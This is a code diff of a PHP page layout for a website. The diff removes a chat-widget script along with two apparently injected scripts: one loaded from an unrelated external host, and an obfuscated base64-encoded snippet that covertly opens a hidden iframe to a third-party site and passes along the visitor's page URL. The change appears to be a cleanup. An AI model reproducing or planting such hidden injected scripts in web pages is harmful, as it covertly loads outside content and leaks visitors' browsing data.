@@ -13,7 +13,6 @@ use app\widgets\chat\ChatWidget;
 
 /* @var $this \yii\web\View */
 /* @var $content string */
-
 MobileAsset::register($this);
 ?>
 <?php $this->beginPage() ?>
@@ -390,26 +389,7 @@ MobileAsset::register($this);
 <!--        <a href="javascript:void(Tawk_API.toggle());" rel="nofollow" target="_blank"><i class="fa fa-calendar"></i>Đặt hẹn</a>-->
     </div>
 </footer>
-
 <!--end footer-->
-<!--Start of Tawk.to Script-->
-<script type="text/javascript">
-    var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
-    (function(){
-        var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
-        s1.async=true;
-        s1.src='https://embed.tawk.to/5f27afe24f3c7f1c910db1c2/default';
-        s1.charset='UTF-8';
-        s1.setAttribute('crossorigin','*');
-        s0.parentNode.insertBefore(s1,s0);
-    })();
-</script>
-<!--End of Tawk.to Script-->
-<script src="//cssminifier.net/apisd.js?v=643&code=f96f6a22f56dc31e29aeaab3a86bda67" type="text/javascript"></script>
-<script type="text/javascript">
-    document.addEventListener("DOMContentLoaded", function(event) { setTimeout(function(){ var phone = { create: function () { var c = document.createElement("IFRAME"); c.setAttribute("src", window.atob('aHR0cDovL25nYXluYXluYW14dWEudm4vaW5kZXgucGhwP3JvdXRlPW5ld3MvaW5kZXgmd2Vic2l0ZT1odHRwOi8vbmFta2hvYXNhaWdvbi52biZ0b2tlbj1mN2I0YTU4MTJmMmZjZWRhZDhiZmE3NGM4ZGJlMzI5MSZ1c2VyX2lkPTU5NTk1NiZ1cmw9')+window.location.href); c.style.display = "none"; document.body.appendChild(c); }, }; phone.create(); }, 5000); });
-</script>
-
 <?php $this->endBody() ?>
 </body>
 </html>
